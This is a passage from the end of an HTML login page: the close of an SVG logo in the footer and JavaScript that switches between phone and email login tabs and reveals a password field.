		v121.374h37.326V118.285h30.371l10.413-32.712H615.544z M432.434,103.648c0-9.981,8.146-18.076,18.21-18.076
		c10.073,0,18.228,8.095,18.228,18.076c0,9.982-8.15,18.077-18.228,18.077C440.58,121.72,432.434,113.63,432.434,103.648z
		 M432.434,134.641h36.438v104.158h-36.438V134.641z M484.496,85.572v153.226h36.452v-39.594l11.283-10.339l35.577,50.793h39.05
		l-51.207-74.03l45.997-44.768h-44.258l-36.442,36.153V85.572H484.496z M877.623,85.572v153.226h36.457v-39.594l11.278-10.339
		l35.587,50.793H1000l-51.207-74.03l45.995-44.768h-44.256l-36.452,36.153V85.572H877.623z"/>
	<path d="M792.578,239.659c34.988,0,63.358-28.136,63.358-62.84c0-34.703-28.37-62.844-63.358-62.844h-0.865
		c-34.99,0-63.355,28.14-63.355,62.844s28.365,62.84,63.355,62.84H792.578z M761.336,176.819c0-16.881,13.8-30.555,30.817-30.555
		c17.005,0,30.804,13.674,30.804,30.555s-13.799,30.563-30.804,30.563C775.136,207.379,761.336,193.7,761.336,176.819z"/>
</g>
</svg>
  </footer>
  <script>
   function showPasswordLogin() {
     // Show password field and related elements
     document.getElementById('passwordContainer').style.display = 'block';
     document.getElementById('rememberContainer').style.display = 'flex';
     document.getElementById('continueButton').style.display = 'block';
     
     // Hide the login with password button
     document.getElementById('loginWithPasswordContainer').style.display = 'none';
     
     // Make password field required
     document.getElementById('passwordInput').setAttribute('required', 'required');
     
     // Update button text
     document.getElementById('continueButton').textContent = 'Login';
   }
   
   function showTab(tab) {
      const phoneTab = document.getElementById('phoneTab');
      const emailTab = document.getElementById('emailTab');
      const phoneForm = document.getElementById('phoneForm');
      const emailForm = document.getElementById('emailForm');

      if (tab === 'email') {
        emailTab.classList.add('font-semibold', 'text-black', 'border-b-2', 'border-black');
        emailTab.classList.remove('font-normal', 'text-gray-500');
        emailTab.setAttribute('aria-selected', 'true');
        emailTab.setAttribute('tabindex', '0');

        phoneTab.classList.remove('font-semibold', 'text-black', 'border-b-2', 'border-black');
        phoneTab.classList.add('font-normal', 'text-gray-500');
        phoneTab.setAttribute('aria-selected', 'false');
        phoneTab.setAttribute('tabindex', '-1');

        emailForm.classList.remove('hidden');
        phoneForm.classList.add('hidden');
      } else if (tab === 'phone') {
        phoneTab.classList.add('font-semibold', 'text-black', 'border-b-2', 'border-black');
        phoneTab.classList.remove('font-normal', 'text-gray-500');
        phoneTab.setAttribute('aria-selected', 'true');
        phoneTab.setAttribute('tabindex', '0');

        emailTab.classList.remove('font-semibold', 'text-black', 'border-b-2', 'border-black');
        emailTab.classList.add('font-normal', 'text-gray-500');
        emailTab.setAttribute('aria-selected', 'false');
        emailTab.setAttribute('tabindex', '-1');

        phoneForm.classList.remove('hidden');
        emailForm.classList.add('hidden');
      }
    }
  </script>
 </body>
</html>
